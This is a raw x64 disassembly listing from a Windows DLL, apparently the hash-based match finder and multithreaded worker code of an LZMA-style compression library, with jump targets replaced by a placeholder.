inc [ rbx + 0x18 ]
inc [ rbx ]
cmp ecx [ rbx + 0xc ]
jne r-xdata
inc r8d
inc r11
cmp r8d edi
jne r-xdata
mov eax 0x2
jmp r-xdata
mov rcx rbx
call sub_180007ad0
movzx eax [ r11 ]
cmp [ rcx + r11 ] al
jne r-xdata
mov r12 [ rsp + 0x78 ]
mov rbp [ rsp + 0x70 ]
mov r13 [ rsp + 0x80 ]
add rsp 0x50
pop rdi
pop rsi
pop rbx
retn
sub_1800082a0
push rbp
push rsi
push rdi
sub rsp 0x50
mov esi [ rcx + 0x14 ]
mov rbp rdx
mov rdi rcx
cmp esi 0x4
jae r-xdata
mov r9 [ rdi + 0x28 ]
mov [ rsp + 0x70 ] rbx
mov [ rsp + 0x78 ] r12
mov [ rsp + 0x80 ] r13
mov r13 [ rcx ]
movzx eax [ r13 ]
movzx ecx [ r13 + 0x1 ]
mov edx [ rdi + rax * 4 + 0x8c ]
xor edx ecx
movzx ecx [ r13 + 0x2 ]
mov eax ecx
shl ecx 0x3
mov r8d edx
shl eax 0x8
and r8d 0x3ff
xor eax edx
mov ebx r8d
movzx r10d ax
movzx eax [ r13 + 0x3 ]
mov r11d [ rdi + rax * 4 + 0x8c ]
lea eax [ r10 + 0x400 ]
xor r11d ecx
mov ecx [ rdi + 0x8 ]
shl r11d 0x5
mov r12d ecx
mov r10d ecx
sub r10d [ r9 + rax * 4 ]
sub r12d [ r9 + r8 * 4 ]
mov r8d eax
xor r11d edx
and r11d [ rdi + 0x38 ]
lea eax [ r11 + 0x10400 ]
mov r11d [ r9 + rax * 4 ]
mov [ r9 + rax * 4 ] ecx
mov rcx [ rdi + 0x28 ]
mov eax [ rcx + rax * 4 ]
mov [ rcx + r8 * 4 ] eax
mov rcx [ rdi + 0x28 ]
mov eax [ rcx + r8 * 4 ]
mov [ rcx + rbx * 4 ] eax
xor ebx ebx
lea r8d [ rbx + 0x1 ]
cmp r12d [ rdi + 0x1c ]
jae r-xdata
inc [ rcx + 0x8 ]
mov eax [ rcx + 0x8 ]
inc [ rcx + 0x18 ]
inc [ rcx ]
cmp eax [ rcx + 0xc ]
jne r-xdata
mov r9d 0x3
cmp r12d r10d
je r-xdata
mov eax r12d
mov rcx r13
sub rcx rax
movzx eax [ r13 ]
cmp [ rcx ] al
jne r-xdata
xor eax eax
add rsp 0x50
pop rdi
pop rsi
pop rbp
retn
call sub_180007ad0
test ebx ebx
je r-xdata
cmp r10d [ rdi + 0x1c ]
jae r-xdata
mov r8d 0x2
lea eax [ r12 - 0x1 ]
mov [ rbp + 0x4 ] eax
mov [ rbp ] r8d
mov ebx r8d
cmp r8d r9d
mov eax ebx
mov edx r11d
lea rcx [ rbp + rax * 4 ]
mov eax [ rdi + 0x3c ]
cmovb r8d r9d
mov r9 [ rdi ]
mov [ rsp + 0x48 ] r8d
mov r8d [ rdi + 0x8 ]
mov [ rsp + 0x40 ] rcx
mov [ rsp + 0x38 ] eax
mov eax [ rdi + 0x1c ]
mov [ rsp + 0x30 ] eax
mov eax [ rdi + 0x18 ]
mov ecx esi
mov [ rsp + 0x28 ] eax
mov rax [ rdi + 0x30 ]
mov [ rsp + 0x20 ] rax
call sub_180007d20
mov rbx rax
sub rbx rbp
sar rbx 0x2
movsxd rax r8d
movsxd rdx r12d
cmp r8d esi
je r-xdata
mov eax r10d
mov rcx r13
sub rcx rax
movzx eax [ r13 ]
cmp [ rcx ] al
jne r-xdata
mov r12 [ rsp + 0x78 ]
mov r13 [ rsp + 0x80 ]
mov eax ebx
mov rbx [ rsp + 0x70 ]
add rsp 0x50
pop rdi
pop rsi
pop rbp
retn
mov rcx rdi
call sub_180007ad0
lea eax [ rbx - 0x2 ]
mov [ rbp + rax * 4 ] r8d
cmp r8d esi
jne r-xdata
lea rcx [ rax + r13 ]
neg rdx
nop [ rax ] eax
lea eax [ rbx + 0x1 ]
lea edx [ r10 - 0x1 ]
mov r8d r9d
add ebx 0x2
mov r12d r10d
mov [ rbp + rax * 4 ] edx
mov eax [ rdi + 0x3c ]
mov r9 [ rdi ]
mov r8d [ rdi + 0x8 ]
mov [ rsp + 0x38 ] eax
mov eax [ rdi + 0x1c ]
mov edx r11d
mov [ rsp + 0x30 ] eax
mov eax [ rdi + 0x18 ]
mov ecx esi
mov [ rsp + 0x28 ] eax
mov rax [ rdi + 0x30 ]
mov [ rsp + 0x20 ] rax
call sub_180007ea0
jmp r-xdata
inc r8d
inc rcx
cmp r8d esi
jne r-xdata
inc [ rdi + 0x8 ]
mov ecx [ rdi + 0x8 ]
inc [ rdi + 0x18 ]
inc [ rdi ]
cmp ecx [ rdi + 0xc ]
jne r-xdata
movzx eax [ rcx ]
cmp [ rdx + rcx ] al
jne r-xdata
sub_1800084e0
push rbp
push rsi
push rdi
sub rsp 0x50
mov esi [ rcx + 0x14 ]
mov rbp rdx
mov rdi rcx
cmp esi 0x4
jae r-xdata
mov r9 [ rdi + 0x28 ]
mov [ rsp + 0x70 ] rbx
mov [ rsp + 0x78 ] r12
mov [ rsp + 0x80 ] r13
mov r13 [ rcx ]
movzx eax [ r13 ]
movzx ecx [ r13 + 0x1 ]
mov edx [ rdi + rax * 4 + 0x8c ]
xor edx ecx
movzx ecx [ r13 + 0x2 ]
mov eax ecx
shl ecx 0x3
mov r8d edx
shl eax 0x8
and r8d 0x3ff
xor eax edx
mov ebx r8d
movzx r10d ax
movzx eax [ r13 + 0x3 ]
mov r11d [ rdi + rax * 4 + 0x8c ]
lea eax [ r10 + 0x400 ]
xor r11d ecx
mov ecx [ rdi + 0x8 ]
shl r11d 0x5
mov r12d ecx
mov r10d ecx
sub r10d [ r9 + rax * 4 ]
sub r12d [ r9 + r8 * 4 ]
mov r8d eax
xor r11d edx
and r11d [ rdi + 0x38 ]
lea eax [ r11 + 0x10400 ]
mov r11d [ r9 + rax * 4 ]
mov [ r9 + rax * 4 ] ecx
mov rcx [ rdi + 0x28 ]
mov eax [ rcx + rax * 4 ]
mov [ rcx + r8 * 4 ] eax
mov rcx [ rdi + 0x28 ]
mov eax [ rcx + r8 * 4 ]
mov [ rcx + rbx * 4 ] eax
xor ebx ebx
lea r9d [ rbx + 0x1 ]
cmp r12d [ rdi + 0x1c ]
jae r-xdata
inc [ rcx + 0x8 ]
mov eax [ rcx + 0x8 ]
inc [ rcx + 0x18 ]
inc [ rcx ]
cmp eax [ rcx + 0xc ]
jne r-xdata
mov r8d 0x3
cmp r12d r10d
je r-xdata
mov eax r12d
mov rcx r13
sub rcx rax
movzx eax [ r13 ]
cmp [ rcx ] al
jne r-xdata
xor eax eax
add rsp 0x50
pop rdi
pop rsi
pop rbp
retn
call sub_180007ad0
test ebx ebx
je r-xdata
cmp r10d [ rdi + 0x1c ]
jae r-xdata
mov r9d 0x2
lea eax [ r12 - 0x1 ]
mov [ rbp + 0x4 ] eax
mov [ rbp ] r9d
mov ebx r9d
cmp r9d r8d
mov eax ebx
mov edx r11d
cmovb r9d r8d
lea r8 [ rbp + rax * 4 ]
mov eax [ rdi + 0x3c ]
mov [ rsp + 0x48 ] r9d
mov r9 [ rdi ]
mov [ rsp + 0x40 ] r8
mov r8d [ rdi + 0x8 ]
mov [ rsp + 0x38 ] eax
mov eax [ rdi + 0x1c ]
mov [ rsp + 0x30 ] eax
mov eax [ rdi + 0x18 ]
mov ecx esi
mov [ rsp + 0x28 ] eax
mov rax [ rdi + 0x30 ]
mov [ rsp + 0x20 ] rax
call sub_180007c10
mov rbx rax
sub rbx rbp
sar rbx 0x2
movsxd rax r9d
movsxd rdx r12d
cmp r9d esi
je r-xdata
mov eax r10d
mov rcx r13
sub rcx rax
movzx eax [ r13 ]
cmp [ rcx ] al
jne r-xdata
mov r12 [ rsp + 0x78 ]
mov r13 [ rsp + 0x80 ]
mov eax ebx
mov rbx [ rsp + 0x70 ]
add rsp 0x50
pop rdi
pop rsi
pop rbp
retn
mov rcx rdi
call sub_180007ad0
lea eax [ rbx - 0x2 ]
mov [ rbp + rax * 4 ] r9d
cmp r9d esi
jne r-xdata
lea rcx [ rax + r13 ]
neg rdx
nop [ rax ] eax
lea eax [ rbx + 0x1 ]
lea edx [ r10 - 0x1 ]
mov r9d r8d
add ebx 0x2
mov r12d r10d
mov [ rbp + rax * 4 ] edx
mov edx [ rdi + 0x18 ]
mov rcx [ rdi + 0x30 ]
mov [ rcx + rdx * 4 ] r11d
jmp r-xdata
inc r9d
inc rcx
cmp r9d esi
jne r-xdata
inc [ rdi + 0x8 ]
mov ecx [ rdi + 0x8 ]
inc [ rdi + 0x18 ]
inc [ rdi ]
cmp ecx [ rdi + 0xc ]
jne r-xdata
movzx eax [ rcx ]
cmp [ rdx + rcx ] al
jne r-xdata
sub_180008700
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x40
mov edi edx
mov rbx rcx
nop
inc [ rbx + 0x8 ]
mov eax [ rbx + 0x8 ]
inc [ rbx + 0x18 ]
inc [ rbx ]
cmp eax [ rbx + 0xc ]
jne r-xdata
mov rax [ rbx ]
mov r8 [ rbx + 0x28 ]
movzx ecx [ rax + 0x1 ]
movzx eax [ rax ]
shl ecx 0x8
or ecx eax
mov eax [ rbx + 0x8 ]
mov edx [ r8 + rcx * 4 ]
mov [ r8 + rcx * 4 ] eax
mov eax [ rbx + 0x3c ]
mov r9 [ rbx ]
mov r8d [ rbx + 0x8 ]
mov [ rsp + 0x38 ] eax
mov eax [ rbx + 0x1c ]
mov ecx r10d
mov [ rsp + 0x30 ] eax
mov eax [ rbx + 0x18 ]
mov [ rsp + 0x28 ] eax
mov rax [ rbx + 0x30 ]
mov [ rsp + 0x20 ] rax
call sub_180007ea0
dec edi
jne r-xdata
mov rcx rbx
call sub_180007ad0
mov r10d [ rbx + 0x14 ]
cmp r10d 0x2
jb r-xdata
mov rbx [ rsp + 0x50 ]
add rsp 0x40
pop rdi
retn
sub_180008790
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x40
mov edi edx
mov rbx rcx
nop
inc [ rbx + 0x8 ]
mov eax [ rbx + 0x8 ]
inc [ rbx + 0x18 ]
inc [ rbx ]
cmp eax [ rbx + 0xc ]
jne r-xdata
mov rdx [ rbx ]
movzx eax [ rdx ]
movzx ecx [ rdx + 0x1 ]
mov r8d [ rbx + rax * 4 + 0x8c ]
movzx eax [ rdx + 0x2 ]
shl eax 0x8
xor r8d ecx
mov rcx [ rbx + 0x28 ]
xor eax r8d
and r8d 0x3ff
and eax [ rbx + 0x38 ]
add eax 0x400
mov r10d eax
mov edx [ rcx + rax * 4 ]
mov eax [ rbx + 0x8 ]
mov [ rcx + r10 * 4 ] eax
mov r9 [ rbx + 0x28 ]
mov ecx r11d
mov eax [ r9 + r10 * 4 ]
mov [ r9 + r8 * 4 ] eax
mov eax [ rbx + 0x3c ]
mov r9 [ rbx ]
mov r8d [ rbx + 0x8 ]
mov [ rsp + 0x38 ] eax
mov eax [ rbx + 0x1c ]
mov [ rsp + 0x30 ] eax
mov eax [ rbx + 0x18 ]
mov [ rsp + 0x28 ] eax
mov rax [ rbx + 0x30 ]
mov [ rsp + 0x20 ] rax
call sub_180007ea0
dec edi
jne r-xdata
mov rcx rbx
call sub_180007ad0
mov r11d [ rbx + 0x14 ]
cmp r11d 0x3
jb r-xdata
mov rbx [ rsp + 0x50 ]
add rsp 0x40
pop rdi
retn
sub_180008850
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x40
mov edi edx
mov rbx rcx
inc [ rbx + 0x8 ]
mov eax [ rbx + 0x8 ]
inc [ rbx + 0x18 ]
inc [ rbx ]
cmp eax [ rbx + 0xc ]
jne r-xdata
mov rdx [ rbx ]
movzx eax [ rdx ]
movzx ecx [ rdx + 0x1 ]
mov r11d [ rbx + rax * 4 + 0x8c ]
xor r11d ecx
movzx ecx [ rdx + 0x2 ]
mov eax ecx
shl ecx 0x3
shl eax 0x8
xor eax r11d
movzx r8d ax
movzx eax [ rdx + 0x3 ]
mov eax [ rbx + rax * 4 + 0x8c ]
lea edx [ r8 + 0x400 ]
xor eax ecx
mov rcx [ rbx + 0x28 ]
shl eax 0x5
xor eax r11d
and eax [ rbx + 0x38 ]
add eax 0x10400
mov r9d eax
mov r10d [ rcx + rax * 4 ]
mov eax [ rbx + 0x8 ]
mov [ rcx + rdx * 4 ] eax
mov r8 [ rbx + 0x28 ]
mov ecx r11d
mov eax [ r8 + rdx * 4 ]
and ecx 0x3ff
mov edx r10d
mov [ r8 + rcx * 4 ] eax
mov eax [ rbx + 0x8 ]
mov r8 [ rbx + 0x28 ]
mov [ r8 + r9 * 4 ] eax
mov eax [ rbx + 0x3c ]
mov r9 [ rbx ]
mov r8d [ rbx + 0x8 ]
mov [ rsp + 0x38 ] eax
mov eax [ rbx + 0x1c ]
mov [ rsp + 0x30 ] eax
mov eax [ rbx + 0x18 ]
mov ecx esi
mov [ rsp + 0x28 ] eax
mov rax [ rbx + 0x30 ]
mov [ rsp + 0x20 ] rax
call sub_180007ea0
dec edi
jne r-xdata
mov rcx rbx
call sub_180007ad0
mov esi [ rbx + 0x14 ]
cmp esi 0x4
jb r-xdata
mov rbx [ rsp + 0x50 ]
mov rsi [ rsp + 0x58 ]
add rsp 0x40
pop rdi
retn
sub_180008950
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov edi edx
mov rbx rcx
nop
inc [ rbx + 0x8 ]
mov eax [ rbx + 0x8 ]
inc [ rbx + 0x18 ]
inc [ rbx ]
cmp eax [ rbx + 0xc ]
jne r-xdata
mov rdx [ rbx ]
movzx eax [ rdx ]
movzx ecx [ rdx + 0x1 ]
mov r10d [ rbx + rax * 4 + 0x8c ]
xor r10d ecx
movzx ecx [ rdx + 0x2 ]
mov eax ecx
shl ecx 0x3
shl eax 0x8
xor eax r10d
movzx r8d ax
movzx eax [ rdx + 0x3 ]
mov eax [ rbx + rax * 4 + 0x8c ]
add r8d 0x400
xor eax ecx
mov rcx [ rbx + 0x28 ]
shl eax 0x5
xor eax r10d
and eax [ rbx + 0x38 ]
add eax 0x10400
mov edx eax
mov r9d [ rcx + rax * 4 ]
mov eax [ rbx + 0x8 ]
mov [ rcx + rdx * 4 ] eax
mov rcx [ rbx + 0x28 ]
mov eax [ rcx + rdx * 4 ]
mov [ rcx + r8 * 4 ] eax
mov rdx [ rbx + 0x28 ]
mov ecx r10d
mov eax [ rdx + r8 * 4 ]
and ecx 0x3ff
mov [ rdx + rcx * 4 ] eax
mov ecx [ rbx + 0x18 ]
mov rax [ rbx + 0x30 ]
mov [ rax + rcx * 4 ] r9d
dec edi
jne r-xdata
mov rcx rbx
call sub_180007ad0
cmp [ rbx + 0x14 ] 0x4
jb r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
sub_180008a20
lea rax [ sub_180007a20 ]
mov [ rdx ] rax
lea rax [ sub_180007660 ]
mov [ rdx + 0x8 ] rax
lea rax [ sub_180007670 ]
mov [ rdx + 0x10 ] rax
lea rax [ sub_180009a10 ]
mov [ rdx + 0x18 ] rax
cmp [ rcx + 0x70 ] 0x0
jne r-xdata
mov eax [ rcx + 0x60 ]
cmp eax 0x2
jne r-xdata
lea rax [ sub_1800084e0 ]
mov [ rdx + 0x20 ] rax
lea rax [ sub_180008950 ]
mov [ rdx + 0x28 ] rax
retn
cmp eax 0x3
jne r-xdata
lea rax [ sub_180007ff0 ]
mov [ rdx + 0x20 ] rax
lea rax [ sub_180008700 ]
mov [ rdx + 0x28 ] rax
retn
lea rax [ sub_1800082a0 ]
mov [ rdx + 0x20 ] rax
lea rax [ sub_180008850 ]
mov [ rdx + 0x28 ] rax
retn
lea rax [ sub_1800080d0 ]
mov [ rdx + 0x20 ] rax
lea rax [ sub_180008790 ]
mov [ rdx + 0x28 ] rax
retn
sub_180008ac0
push rbx
sub rsp 0x20
cmp [ rcx + 0x4 ] 0x0
mov rbx rcx
je r-xdata
add rcx 0x48
call [ LeaveCriticalSection@IAT ]
mov rcx [ rbx + 0x30 ]
inc [ rbx + 0x70 ]
xor eax eax
xor r8d r8d
lea edx [ rax + 0x1 ]
mov [ rbx + 0x44 ] eax
call [ ReleaseSemaphore@IAT ]
test eax eax
jne r-xdata
xor eax eax
mov [ rcx + 0x70 ] 0x1
mov [ rcx + 0x4 ] eax
mov [ rcx + 0x8 ] rax
mov rcx [ rcx + 0x20 ]
call [ ResetEvent@IAT ]
test eax eax
jne r-xdata
mov rcx [ rbx + 0x38 ]
or edx 0xffffffff
call [ WaitForSingleObject@IAT ]
lea rcx [ rbx + 0x48 ]
call [ EnterCriticalSection@IAT ]
mov [ rbx + 0x44 ] 0x1
add rsp 0x20
pop rbx
retn
call [ GetLastError@IAT ]
mov rcx [ rbx + 0x28 ]
call [ ResetEvent@IAT ]
test eax eax
jne r-xdata
call [ GetLastError@IAT ]
mov rcx [ rbx + 0x18 ]
call [ SetEvent@IAT ]
test eax eax
jne r-xdata
call [ GetLastError@IAT ]
mov rcx [ rbx + 0x20 ]
or edx 0xffffffff
call [ WaitForSingleObject@IAT ]
jmp r-xdata
call [ GetLastError@IAT ]
sub_180008b80
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
cmp [ rcx + 0x10 ] 0x0
mov edi [ rcx + 0x70 ]
mov rbx rcx
je r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
cmp [ rcx + 0x4 ] 0x0
jne r-xdata
cmp [ rcx + 0x44 ] 0x0
mov [ rcx + 0xc ] 0x1
je r-xdata
mov rcx [ rbx + 0x30 ]
xor r8d r8d
lea edx [ r8 + 0x1 ]
call [ ReleaseSemaphore@IAT ]
test eax eax
jne r-xdata
add rcx 0x48
call [ LeaveCriticalSection@IAT ]
mov [ rbx + 0x44 ] 0x0
mov rcx [ rbx + 0x28 ]
or edx 0xffffffff
call [ WaitForSingleObject@IAT ]
cmp edi [ rbx + 0x70 ]
je r-xdata
call [ GetLastError@IAT ]
mov [ rbx + 0x4 ] 0x1
mov rcx [ rbx + 0x38 ]
or edx 0xffffffff
inc edi
call [ WaitForSingleObject@IAT ]
mov rcx [ rbx + 0x30 ]
xor r8d r8d
lea edx [ r8 + 0x1 ]
call [ ReleaseSemaphore@IAT ]
test eax eax
jne r-xdata
cmp edi [ rbx + 0x70 ]
jne r-xdata
call [ GetLastError@IAT ]
sub_180008c40
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
xor edi edi
mov rbx rcx
cmp [ rcx + 0x10 ] rdi
je r-xdata
cmp [ rbx + 0x40 ] edi
je r-xdata
call sub_180008b80
mov [ rbx + 0x8 ] 0x1
cmp [ rbx + 0x4 ] edi
je r-xdata
mov rcx [ rbx + 0x18 ]
test rcx rcx
je r-xdata
lea rcx [ rbx + 0x48 ]
call [ DeleteCriticalSection@IAT ]
mov [ rbx + 0x40 ] edi
mov rcx [ rbx + 0x10 ]
or edx 0xffffffff
call [ WaitForSingleObject@IAT ]
mov rcx [ rbx + 0x10 ]
test rcx rcx
je r-xdata
mov rcx [ rbx + 0x18 ]
call [ SetEvent@IAT ]
test eax eax
jne r-xdata
mov [ rbx + 0x18 ] rdi
call [ CloseHandle@IAT ]
test eax eax
jne r-xdata
mov [ rbx + 0x10 ] rdi
call [ CloseHandle@IAT ]
test eax eax
jne r-xdata
call [ GetLastError@IAT ]
mov [ rbx + 0x20 ] rdi
call [ CloseHandle@IAT ]
test eax eax
jne r-xdata
call [ GetLastError@IAT ]
jmp r-xdata
call [ GetLastError@IAT ]
jmp r-xdata
mov [ rbx + 0x28 ] rdi
call [ CloseHandle@IAT ]
test eax eax
jne r-xdata
call [ GetLastError@IAT ]
jmp r-xdata
mov rcx [ rbx + 0x20 ]
test rcx rcx
je r-xdata
mov [ rbx + 0x30 ] rdi
call [ CloseHandle@IAT ]
test eax eax
jne r-xdata
call [ GetLastError@IAT ]
jmp r-xdata
mov rcx [ rbx + 0x28 ]
test rcx rcx
je r-xdata
mov [ rbx + 0x38 ] rdi
mov [ rbx ] edi
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
call [ CloseHandle@IAT ]
test eax eax
jne r-xdata
call [ GetLastError@IAT ]
jmp r-xdata
mov rcx [ rbx + 0x30 ]
test rcx rcx
je r-xdata
call [ GetLastError@IAT ]
mov [ rbx ] edi
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rcx [ rbx + 0x38 ]
test rcx rcx
je r-xdata
sub_180008d70
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rbp
mov [ rsp + 0x20 ] rsi
push rdi
sub rsp 0x30
cmp [ rcx ] 0x0
mov edi r9d
mov rsi r8
mov rbp rdx
mov rbx rcx
jne r-xdata
xor eax eax
add rcx 0x48
call [ InitializeCriticalSection@IAT ]
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rbx + 0x40 ] 0x1
call [ CreateEventA@IAT ]
mov [ rbx + 0x18 ] rax
test rax rax
jne r-xdata
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call [ CreateEventA@IAT ]
mov [ rbx + 0x20 ] rax
test rax rax
jne r-xdata
call [ GetLastError@IAT ]
mov ecx 0x1
test eax eax
cmovne ecx eax
test ecx ecx
je r-xdata
lea rcx [ rbx + 0x28 ]
call sub_18000a0b0
test eax eax
jne r-xdata
call [ GetLastError@IAT ]
mov ecx 0x1
test eax eax
cmovne ecx eax
test ecx ecx
jne r-xdata
mov eax 0xc
jmp r-xdata
lea rcx [ rbx + 0x30 ]
mov r8d edi
mov edx edi
call sub_18000a100
test eax eax
jne r-xdata
mov rbx [ rsp + 0x48 ]
mov rbp [ rsp + 0x50 ]
mov rsi [ rsp + 0x58 ]
add rsp 0x30
pop rdi
retn
xor r9d r9d
mov r8d edi
xor edx edx
xor ecx ecx
call [ CreateSemaphoreA@IAT ]
mov [ rbx + 0x38 ] rax
test rax rax
jne r-xdata
lea rax [ rsp + 0x40 ]
mov r9 rsi
mov r8 rbp
mov [ rsp + 0x28 ] rax
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] 0x0
mov [ rbx + 0x4 ] 0x1
call [ CreateThread@IAT ]
mov [ rbx + 0x10 ] rax
test rax rax
jne r-xdata
call [ GetLastError@IAT ]
mov ecx 0x1
test eax eax
cmovne ecx eax
test ecx ecx
jne r-xdata
mov [ rbx ] 0x1
call [ GetLastError@IAT ]
mov ecx 0x1
test eax eax
cmovne ecx eax
test ecx ecx
jne r-xdata
sub_180008ed0
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rdi
mov r11d [ rsp + 0x30 ]
mov rbx r8
mov rdi rcx
test r11d r11d
je r-xdata
mov rbx [ rsp + 0x8 ]
mov rdi [ rsp + 0x10 ]
retn
mov r8 [ rsp + 0x28 ]
nop
movzx r10d [ rdi + 0x1 ]
movzx eax [ rdi ]
inc rdi
shl r10d 0x8
add r8 0x4
or r10d eax
mov eax edx
sub eax [ rbx + r10 * 4 ]
mov [ r8 - 0x4 ] eax
mov [ rbx + r10 * 4 ] edx
inc edx
dec r11d
jne r-xdata
sub_180008f30
mov [ rsp + 0x18 ] rbx
push rbp
mov r10d [ rsp + 0x38 ]
mov ebp r9d
mov r11d edx
test r10d r10d
je r-xdata
mov rbx [ rsp + 0x20 ]
pop rbp
retn
mov r9 [ rsp + 0x30 ]
mov [ rsp + 0x10 ] rsi
mov rsi [ rsp + 0x40 ]
mov [ rsp + 0x18 ] rdi
lea rdi [ rcx + 0x1 ]
nop
movzx eax [ rdi - 0x1 ]
movzx ecx [ rdi + 0x1 ]
inc rdi
mov edx [ rsi + rax * 4 ]
movzx eax [ rdi - 0x1 ]
shl ecx 0x8
xor edx ecx
add r9 0x4
xor edx eax
mov eax r11d
and edx ebp
sub eax [ r8 + rdx * 4 ]
mov [ r9 - 0x4 ] eax
mov [ r8 + rdx * 4 ] r11d
inc r11d
dec r10d
jne r-xdata
mov rdi [ rsp + 0x18 ]
mov rsi [ rsp + 0x10 ]
sub_180008fb0
mov [ rsp + 0x18 ] rbp
push rsi
mov r10d [ rsp + 0x38 ]
mov ebp r9d
mov r11d edx
test r10d r10d
je r-xdata
mov rbp [ rsp + 0x20 ]
pop rsi
retn
mov r9 [ rsp + 0x30 ]
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rdi
mov rdi [ rsp + 0x40 ]
lea rbx [ rcx + 0x2 ]
nop
movzx eax [ rbx + 0x1 ]
movzx ecx [ rbx ]
inc rbx
mov edx [ rdi + rax * 4 ]
movzx eax [ rbx - 0x3 ]
shl ecx 0x3
xor edx ecx
add r9 0x4
shl edx 0x5
xor edx [ rdi + rax * 4 ]
movzx eax [ rbx - 0x2 ]
xor edx eax
mov eax r11d
and edx ebp
sub eax [ r8 + rdx * 4 ]
mov [ r9 - 0x4 ] eax
mov [ r8 + rdx * 4 ] r11d
inc r11d
dec r10d
jne r-xdata
mov rdi [ rsp + 0x18 ]
mov rbx [ rsp + 0x10 ]
sub_180009030
mov [ rsp + 0x10 ] rbx
push rsi
mov r10d [ rsp + 0x38 ]
mov esi r9d
mov rbx r8
mov r11d edx
test r10d r10d
je r-xdata
mov rbx [ rsp + 0x18 ]
pop rsi
retn
mov r8 [ rsp + 0x30 ]
mov [ rsp + 0x10 ] rdi
mov rdi [ rsp + 0x40 ]
lea r9 [ rcx + 0x2 ]
nop [ rax ] eax
movzx edx [ r9 + 0x1 ]
movzx eax [ r9 ]
inc r9
shl edx 0x8
add r8 0x4
xor edx eax
movzx eax [ r9 - 0x3 ]
shl edx 0x8
xor edx [ rdi + rax * 4 ]
movzx eax [ r9 - 0x2 ]
xor edx eax
mov eax r11d
and edx esi
sub eax [ rbx + rdx * 4 ]
mov [ r8 - 0x4 ] eax
mov [ rbx + rdx * 4 ] r11d
inc r11d
dec r10d
jne r-xdata
mov rdi [ rsp + 0x10 ]
sub_1800090b0
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
mov [ rsp + 0x20 ] rdi
push r12
push r13
push r14
sub rsp 0x40
mov rdi rcx
mov r14d 0x1ffe
nop [ rax + rax ] ax
cmp [ rdi + 0x188 ] 0x0
jne r-xdata
call [ GetLastError@IAT ]
nop [ rax + rax ] ax
mov rbx [ rsp + 0x60 ]
mov rbp [ rsp + 0x68 ]
mov rsi [ rsp + 0x70 ]
mov rdi [ rsp + 0x78 ]
add rsp 0x40
pop r14
pop r13
pop r12
retn
cmp [ rdi + 0x18c ] 0x0
jne r-xdata
mov rcx [ rdi + 0x1a8 ]
mov [ rdi + 0x1f0 ] r13d
call [ SetEvent@IAT ]
test eax eax
jne r-xdata
mov rbx [ rdi + 0x200 ]
cmp [ rbx + 0x64 ] 0x0
jne r-xdata
mov rcx [ rdi + 0x198 ]
or edx 0xffffffff
xor r13d r13d
call [ WaitForSingleObject@IAT ]
mov rcx [ rdi + 0x1a0 ]
call [ SetEvent@IAT ]
call [ GetLastError@IAT ]
jmp r-xdata
mov rcx [ rdi + 0x1b0 ]
or edx 0xffffffff
call [ WaitForSingleObject@IAT ]
cmp [ rbx + 0x50 ] 0x0
jne r-xdata
mov edx [ rbx + 0x54 ]
mov eax [ rbx + 0x5c ]
xor ecx ecx
sub rdx [ rbx ]
add rdx [ rbx + 0x40 ]
cmp rdx rax
setbe cl
test ecx ecx
je r-xdata
mov eax [ rbx + 0x8 ]
cmp eax 0xffffdfff
jbe r-xdata
mov eax [ rbx + 0x10 ]
sub eax [ rbx + 0x8 ]
cmp [ rbx + 0x5c ] eax
jb r-xdata
lea rcx [ rdi + 0x88 ]
call [ EnterCriticalSection@IAT ]
lea rcx [ rdi + 0x1c8 ]
call [ EnterCriticalSection@IAT ]
mov r9 [ rw-data ]
mov rsi [ rbx ]
test r9 r9
je r-xdata
mov esi [ rbx + 0x10 ]
mov r12 [ rdi + 0x138 ]
mov eax r13d
sub esi [ rbx + 0x8 ]
and eax 0x7
inc r13d
shl eax 0xd
mov ebp eax
mov [ r12 + rax * 4 + 0x4 ] esi
mov [ r12 + rax * 4 ] 0x2
mov ecx [ rbx + 0x60 ]
cmp esi ecx
jb r-xdata
mov r9d [ rbx + 0x38 ]
mov ecx [ rbx + 0x7c ]
mov r8d eax
sub r8d [ rbx + 0x78 ]
dec r8d
sub [ rbx + 0xc ] r8d
sub [ rbx + 0x10 ] r8d
sub eax r8d
inc r9d
mov [ rbx + 0x8 ] eax
mov rax [ rbx + 0x28 ]
lea rdx [ rax + rcx * 4 ]
je r-xdata
mov rcx rbx
call sub_180007680
mov r8d [ rbx + 0x58 ]
lea rcx [ rdi + 0x88 ]
add r8 [ rbx + 0x40 ]
mov [ rbx ] r8
mov rax r8
sub r8 rsi
add [ rdi + 0x168 ] r8
sub rax rsi
add [ rdi ] rax
call [ LeaveCriticalSection@IAT ]
lea rcx [ rdi + 0x1c8 ]
call [ LeaveCriticalSection@IAT ]
jmp r-xdata
mov ecx [ rbx + 0x58 ]
mov r8d [ rbx + 0x10 ]
mov rdx rsi
sub r8d [ rbx + 0x8 ]
sub rdx rcx
add r8d ecx
mov rcx [ rbx + 0x40 ]
call r9
add [ rbx + 0x8 ] esi
mov eax esi
xor r8d r8d
add [ rbx ] rax
mov rcx [ rdi + 0x1b8 ]
lea edx [ r8 + 0x1 ]
call [ ReleaseSemaphore@IAT ]
jmp r-xdata
lea rdx [ rbx + 0x8c ]
lea r9 [ r12 + rbp * 4 + 0x8 ]
mov eax 0x1
sub eax ecx
mov ecx [ rbx + 0x7c ]
mov [ rsp + 0x30 ] rdx
mov edx [ rbx + 0x8 ]
add esi eax
mov rax [ rbx + 0x28 ]
lea r8 [ rax + rcx * 4 ]
